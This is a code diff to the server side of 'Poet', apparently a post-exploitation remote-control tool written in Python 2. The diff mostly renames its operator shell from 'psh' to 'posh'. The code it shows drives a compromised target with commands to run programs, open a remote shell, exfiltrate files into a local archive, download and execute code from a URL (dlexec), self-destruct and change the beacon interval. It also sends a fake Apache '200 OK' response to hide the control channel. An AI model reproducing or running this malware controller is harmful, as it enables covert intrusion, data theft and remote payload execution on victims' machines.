@@ -16,7 +16,7 @@ from poetsocket import *
 __version__ = '0.4.2'
 
 OUT = 'archive'
-PSH_PROMPT = 'psh > '
+POSH_PROMPT = 'posh > '
 FAKEOK = """HTTP/1.1 200 OK\r
 Date: Tue, 19 Mar 2013 22:12:25 GMT\r
 Server: Apache\r
@@ -41,12 +41,12 @@ class PoetSocketServer(PoetSocket):
 class PoetServer(object):
     """Core server functionality.
 
-    Implements psh, and necessary helper functions.
+    Implements control shell, and necessary helper functions.
 
     Attributes:
         s: socket instance for initial client connection
         conn: socket instance for actual client communication
-        cmds: list of supported psh commands
+        cmds: list of supported control shell commands
     """
 
     def __init__(self, s):
@@ -55,17 +55,17 @@ class PoetServer(object):
         self.cmds = ['exit', 'help', 'exec', 'recon', 'shell', 'exfil',
                      'selfdestruct', 'dlexec', 'chint']
 
-    def psh(self):
+    def start(self):
         """Poet server control shell."""
 
         print '[+] ({}) Entering control shell'.format(datetime.now())
         self.conn = PoetSocket(self.s.accept()[0])
         prompt = self.conn.exchange('getprompt')
-        print 'Welcome to psh, the Poet shell!'
+        print 'Welcome to posh, the Poet Shell!'
         print 'Running `help\' will give you a list of supported commands.'
         while True:
             try:
-                inp = raw_input(PSH_PROMPT)
+                inp = raw_input(POSH_PROMPT)
                 if inp == '':
                     continue
                 base = inp.split()[0]
@@ -107,7 +107,7 @@ class PoetServer(object):
                         for file in inp.split()[1:]:
                             resp = self.conn.exchange('exfil ' + file)
                             if 'No such' in resp:
-                                print 'psh : {}: {}'.format(resp, file)
+                                print 'posh : {}: {}'.format(resp, file)
                                 continue
                             resp = zlib.decompress(resp)
                             write_file = file.split('/')[-1].strip('.')
@@ -125,9 +125,9 @@ class PoetServer(object):
                                 print '[+] ({}) Exiting control shell.'.format(datetime.now())
                                 return
                             else:
-                                print 'psh : Self destruct error: {}'.format(resp)
+                                print 'posh : Self destruct error: {}'.format(resp)
                         else:
-                            print 'psh : Aborting self destruct.'
+                            print 'posh : Aborting self destruct.'
                     else:
                         self.cmd_help(6)
                 # dlexec
@@ -135,7 +135,7 @@ class PoetServer(object):
                     if re.search('^dlexec https?:\/\/[\w.\/]+$', inp):
                         resp = self.conn.exchange(inp)
                         msg = 'successful' if resp == 'done' else 'error: ' + resp
-                        print 'psh : dlexec {}'.format(msg)
+                        print 'posh : dlexec {}'.format(msg)
                     else:
                         self.cmd_help(7)
                 # chint
@@ -145,7 +145,7 @@ class PoetServer(object):
                     else:
                         self.cmd_help(8)
                 else:
-                    print 'psh: {}: command not found'.format(base)
+                    print 'posh: {}: command not found'.format(base)
             except KeyboardInterrupt:
                 print
                 continue
@@ -200,10 +200,10 @@ class PoetServer(object):
             os.mkdir(out_prefix_dir)
         with open(outfile, 'w') as f:
             f.write(response)
-            print 'psh : {} written to {}'.format(prefix, outfile)
+            print 'posh : {} written to {}'.format(prefix, outfile)
 
     def cmd_help(self, ind):
-        """Print help messages for psh commands."""
+        """Print help messages for posh commands."""
 
         if ind == 2:
             print 'Execute commands on target.'
@@ -252,7 +252,7 @@ class PoetServer(object):
             print '-h\t\tshow help'
 
     def exec_preproc(self, inp):
-        """Parse psh `exec' command line.
+        """Parse posh `exec' command line.
 
         Args:
             inp: raw `exec' command line
@@ -273,7 +273,7 @@ class PoetServer(object):
         return tmp, write_flag, write_file
 
     def shell(self, prompt):
-        """Psh `shell' command server-side.
+        """Posh `shell' command server-side.
 
         Args:
             prompt: shell prompt to use
@@ -281,7 +281,7 @@ class PoetServer(object):
 
         while True:
             try:
-                inp = raw_input(PSH_PROMPT + prompt).strip()
+                inp = raw_input(POSH_PROMPT + prompt).strip()
             except KeyboardInterrupt:  # Ctrl-C -> new prompt
                 print
                 continue
@@ -294,7 +294,7 @@ class PoetServer(object):
             elif inp == 'exit':
                 break
             elif inp.split()[0] in self.cmds:
-                print """[!] WARNING: You've entered a psh command into the real remote shell on the
+                print """[!] WARNING: You've entered a posh command into the real remote shell on the
     target. Continue? (y/n)""",
                 if raw_input().lower()[0] != 'y':
                     continue
@@ -329,11 +329,11 @@ class PoetServer(object):
             num = int(num)
             # 1 second to 1 day
             if num < 1 or num > 60*60*24:
-                print 'psh : Invalid interval time.'
+                print 'posh : Invalid interval time.'
             else:
                 resp = self.conn.exchange(inp)
                 msg = 'successful' if resp == 'done' else 'error: ' + resp
-                print 'psh : chint ({}) {}'.format(num, msg)
+                print 'posh : chint ({}) {}'.format(num, msg)
         else:
             # no argument
             print self.conn.exchange(inp)
@@ -442,7 +442,7 @@ def main():
             conn.send(FAKEOK)
             conn.close()
             try:
-                PoetServer(s).psh()
+                PoetServer(s).start()
                 break
             except socket.error as e:
                 die('Socket error: {}'.format(e.message))
